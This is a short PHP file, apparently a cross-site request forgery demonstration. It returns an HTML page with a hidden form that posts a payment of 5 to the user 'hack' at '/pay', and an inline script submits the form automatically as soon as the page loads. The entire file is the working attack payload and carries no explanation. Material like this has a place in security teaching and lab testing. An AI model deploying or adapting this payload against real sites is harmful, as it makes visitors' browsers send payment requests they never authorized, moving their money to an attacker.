<?php
return"
    <body>
        <div class=\"login-page\">
            <form id ='test' action='/pay' method='post'>
                <input type='text' name='money' value='5'>
                <input type='text' name='user' value='hack' >
            </form>
            <script>
                test.submit();
            </script>
        </div>
    </body>
";
?>